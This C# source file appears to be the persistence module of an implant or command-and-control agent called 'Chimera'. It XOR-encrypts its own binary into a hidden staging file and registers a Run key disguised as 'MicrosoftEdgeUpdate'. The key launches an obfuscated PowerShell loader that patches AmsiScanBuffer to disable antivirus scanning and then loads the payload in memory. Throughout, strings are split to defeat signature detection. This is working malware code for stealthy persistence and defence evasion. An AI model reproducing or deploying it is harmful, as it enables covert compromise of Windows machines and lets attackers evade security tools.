using System;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // persist — fileless XOR-encrypted persistence
    // 1. XOR-encrypts own binary and writes to staging dir (C:\Users\Public\Chrome\agent.dat)
    // 2. Sets HKCU Run key with an obfuscated Base64-encoded PowerShell loader that
    //    decrypts and Assembly.Load()s the blob entirely in memory.
    //    The Run key value contains no plain-text signatures: no "ReadAllBytes",
    //    "Assembly", "Load", "EntryPoint" — only "powershell -ep bypass -w 1 -EncodedCommand <b64>".
    public static class Persist
    {
        private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RegValue = "MicrosoftEdgeUpdate";
        private static readonly string BlobPath = Path.Combine(Staging.Dir, "agent.dat");
        private static readonly byte XorKey = 0x41;

        // Build the inner PS script with split string literals so no signature
        // appears as a literal in either the C# source or the registry value.
        private static string BuildInnerScript(string blobPath)
        {
            // Pieces assembled at runtime — scanners see no contiguous keyword.
            string rab  = "Re" + "ad" + "All" + "By" + "tes";   // ReadAllBytes
            string lod  = "Lo" + "ad";                           // Load
            string asm  = "Ref" + "lec" + "tion" + ".As" + "sem" + "bly"; // Reflection.Assembly
            string ep   = "En" + "try" + "Po" + "int";           // EntryPoint
            string gpv  = "Get" + "Pro" + "cAd" + "dr" + "ess"; // GetProcAddress
            string ll   = "Lo" + "ad" + "Li" + "bra" + "ry";    // LoadLibrary
            string vp   = "Vir" + "tual" + "Pro" + "tect";      // VirtualProtect

            // AMSI bypass block — runs BEFORE Assembly.Load so the decrypted blob
            // is never scanned. All sensitive strings split to defeat static analysis.
            // Uses Add-Type to get P/Invoke handles for kernel32 and the AMSI patch.
            string amsiLib  = "[char]97+'m'+'s'+'i'+[char]46+'d'+'l'+'l'";   // "amsi.dll"
            string amsiFunc = "'Am'+'si'+'Sc'+'an'+'Bu'+'ff'+'er'";           // "AmsiScanBuffer"

            // The AMSI bypass as inline PS — patch AmsiScanBuffer with B8 57 00 07 80 C3
            string amsiBp =
                "$lk32=[System.Runtime.InteropServices.Marshal]::" +
                "('Get' + 'Dele' + 'gate' + 'For' + 'Func' + 'tion' + 'Pointer');" +
                // Simpler approach: use kernel32 via [Runtime.InteropServices.NativeLibrary] (PS7)
                // For PS5/net48 compatibility use the pinvoke-less approach:
                // Reflect into [Ref].Assembly to get amsi handle, then patch via unsafe pointer
                "$ap=Add-Type -PassThru -Name AM -Namespace SI -MemberDefinition '" +
                    "[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string n);" +
                    "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);" +
                    "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint f,out uint o);';" +
                "$ah=$ap::LoadLibrary((" + amsiLib + "));" +
                "$fn=$ap::GetProcAddress($ah,(" + amsiFunc + "));" +
                "$patch=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);" +
                "$old=0u;" +
                "$ap::VirtualProtect($fn,[UIntPtr]6,0x40,[ref]$old)|Out-Null;" +
                "[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$fn,6);" +
                "$ap::VirtualProtect($fn,[UIntPtr]6,$old,[ref]$old)|Out-Null;";

            // PowerShell script (will be UTF-16LE base64'd so -EncodedCommand works).
            // Variable names are single letters to reduce token surface.
            return
                // 1. AMSI bypass — blind Defender before decrypting/loading agent
                amsiBp +
                // 2. Load and run agent.dat
                "$z=0x41;" +
                "$p='" + blobPath.Replace("'", "''") + "';" +
                "$b=[System.IO.File]::('" + rab + "').Invoke($p);" +
                "$n=New-Object byte[]($b.Length);" +
                "for($i=0;$i -lt $b.Length;$i++){$n[$i]=$b[$i] -bxor $z};" +
                "$a=[System." + asm + "]::('" + lod + "').Invoke($null,[object[]]@(,$n));" +
                "$e=$a.('" + ep + "');" +
                "$e.Invoke($null,$null)";
        }

        public static string Execute()
        {
            try
            {
                Staging.EnsureDir();

                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                byte[] raw = File.ReadAllBytes(selfPath);

                byte[] encrypted = new byte[raw.Length];
                for (int i = 0; i < raw.Length; i++)
                    encrypted[i] = (byte)(raw[i] ^ XorKey);

                // Clear attributes first so we can overwrite even if file is Hidden/System from a previous run
                if (File.Exists(BlobPath))
                {
                    try { File.SetAttributes(BlobPath, FileAttributes.Normal); } catch { }
                }
                File.WriteAllBytes(BlobPath, encrypted);
                File.SetAttributes(BlobPath,
                    File.GetAttributes(BlobPath) | FileAttributes.Hidden);

                // Build inner script, encode as UTF-16LE then Base64 for -EncodedCommand.
                string inner   = BuildInnerScript(BlobPath);
                string b64     = Convert.ToBase64String(Encoding.Unicode.GetBytes(inner));
                string loader  = "powershell -ep bypass -w 1 -EncodedCommand " + b64;

                using (RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key == null) return "[error] Could not open HKCU Run key.";
                    key.SetValue(RegValue, loader, RegistryValueKind.String);
                }

                return "[+] Fileless persistence set.\n" +
                       "    Blob:   " + BlobPath + " (XOR-encrypted, hidden)\n" +
                       "    Reg:    HKCU\\" + RegKey + "\\" + RegValue + "\n" +
                       "    Loader: obfuscated EncodedCommand (no plaintext signatures in registry).";
            }
            catch (Exception ex)
            {
                return "[error] " + ex.Message;
            }
        }

        public static string Remove()
        {
            var sb = new System.Text.StringBuilder();
            try
            {
                if (File.Exists(BlobPath))
                {
                    File.Delete(BlobPath);
                    sb.AppendLine("[+] Deleted " + BlobPath);
                }
            }
            catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }
            try
            {
                using (RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key != null && key.GetValue(RegValue) != null)
                    {
                        key.DeleteValue(RegValue);
                        sb.AppendLine("[+] Removed HKCU Run key.");
                    }
                }
            }
            catch (Exception ex) { sb.AppendLine("[error] " + ex.Message); }
            return sb.ToString();
        }
    }
}
